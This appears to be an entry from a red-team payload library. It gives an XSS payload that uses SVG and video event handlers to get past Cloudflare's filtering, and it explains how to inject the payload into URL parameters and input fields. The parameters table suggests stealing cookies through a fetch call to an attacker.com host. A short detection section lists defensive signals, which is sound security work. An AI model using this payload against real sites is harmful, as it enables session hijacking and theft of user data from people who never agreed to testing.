---
id: 363f14c9-5a55-4c92-904f-afd33ee199a3
type: code
language: HTML
verified: true
created_at: '2023-04-06T03:56:43.305903+00:00'
updated_at: '2023-04-10T20:21:48.538070+00:00'
tags:
  - xss
  - payload
  - bypass
  - cloudflare
platforms:
  - Web
validated: true
---

# SVG-Video-XSS-Bypass-Payload-for-Cloudflare

## Code

```html
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>
```

## Description

This HTML snippet is a malicious payload designed to bypass Cloudflare's XSS protections by embedding JavaScript in SVG and video elements. The SVG triggers on load using an obfuscated onload handler, while the video activates on mouse hover with an onmouseover handler. Both execute confirm(1) as a proof-of-concept, but can be replaced with more harmful actions like document.cookie theft or beaconing to an attacker server. Use this in reflected/stored XSS contexts where standard <script> tags are filtered.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| confirm(1) | Placeholder JavaScript action (replace with actual exploit) | alert(document.cookie) or fetch('http://attacker.com?data='+document.cookie) |

## Usage

Inject this payload into vulnerable input fields (e.g., search queries, comments) on Cloudflare-protected sites. For example, append to a URL parameter: ?q=<svg/onrandom=random onload=confirm(1)><video onnull=null onmouseover=confirm(1)>. Trigger by loading the page (SVG) or hovering (video). Ideal for client-side execution in red team engagements or vulnerability assessments. Related procedure: [[procedures/Cloudflare-XSS-Bypass-using-SVG-and-Video-Injection]].

## Detection

- WAF logs showing unblocked SVG/video tags with unusual attributes (onrandom, onnull).
- Browser CSP violations or XSS auditor alerts on event handler execution.
- Network monitoring for unexpected outbound requests from injected scripts.
- Static analysis of inputs for embedded media elements with handlers; use tools like OWASP ZAP for scanning.
